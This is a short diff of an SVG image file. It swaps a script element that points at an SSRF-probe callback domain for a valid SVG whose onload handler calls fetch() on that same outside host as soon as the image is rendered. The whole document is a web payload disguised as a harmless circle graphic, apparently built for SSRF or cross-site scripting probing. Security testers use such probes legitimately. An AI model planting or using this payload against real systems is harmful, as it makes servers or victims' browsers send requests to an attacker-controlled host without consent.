@@ -1,3 +1,6 @@
-  <script xmlns="http://www.w3.org/2000/svg/"
-type="text/javascript" xmlns:xlink="http://www.w3.org/1999/xlink/"
-xlink:href="https://ew6es3iv.ssrf.cvssadvisor.com"/>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ew6es3iv.ssrf.cvssadvisor.com')">
+  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
+</svg>
